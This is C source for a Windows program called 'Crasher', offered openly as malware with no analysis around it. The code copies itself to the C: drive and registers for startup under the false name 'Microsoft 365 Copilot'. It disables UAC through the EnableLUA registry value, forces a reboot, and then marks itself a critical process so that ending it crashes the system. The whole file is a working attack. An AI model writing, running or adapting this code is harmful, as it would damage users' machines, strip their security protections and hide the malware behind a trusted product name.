#include <Windows.h>
/*This is compatible with all Windows versions from XP to 11 (32-bit or 64-bit).
	Created by Ali Diaa*/

int reboot() {
	HANDLE h;
	TOKEN_PRIVILEGES tp;

	OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&h);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(h, FALSE, &tp, 0, NULL, NULL);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, 0);
	return 0;
}

int set_critical() {
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb);
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(20, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"I cannot adjust my debug privileges...", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"I cannot find RtlAdjustPrivilege.\nWTF is this?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

		return FALSE;
	}

	if (RtlSetProcessIsCritical)
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"It is not letting me become a critical process.\nThis is not fair!", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"I cannot find RtlSetProcessIsCritical.\nDo you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

		return FALSE;
	}
	return 0;
}

int copy_file() {
	wchar_t self[MAX_PATH];
	GetModuleFileNameW(NULL, self, MAX_PATH);
	CopyFileW(self, L"C:\\Crasher.exe", FALSE);
	return 0;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR szCmdLine, _In_ int nShowCmd) {

	if (GetFileAttributesW(L"C:\\Crasher.exe") == INVALID_FILE_ATTRIBUTES) {

		// Copying the Crasher to the C: drive
		copy_file();

		// Setting the Crasher to run on startup
		HKEY hkey;
		const wchar_t* path = L"C:\\Crasher.exe";
		RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
		RegSetValueExW(
			hkey,
			L"Microsoft 365 Copilot",
			0,
			REG_SZ,
			(const BYTE*)path,
			(DWORD)((wcslen(path) + 1) * sizeof(wchar_t))
		);
		RegCloseKey(hkey);

		// Reboot to apply the changes (file copying + startup value on Windows Registry
		reboot();

		// Intercourse with UAC
		HKEY uac;
		DWORD uacValue = 0;
		RegCreateKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &uac);
		RegSetValueExW(uac, L"EnableLUA", 0, REG_DWORD, (BYTE*)&uacValue, sizeof(DWORD));
		RegCloseKey(uac);
	}
	else {
		// Setting the Crasher to run on startup
		set_critical();
	}
	
	return 0;
}

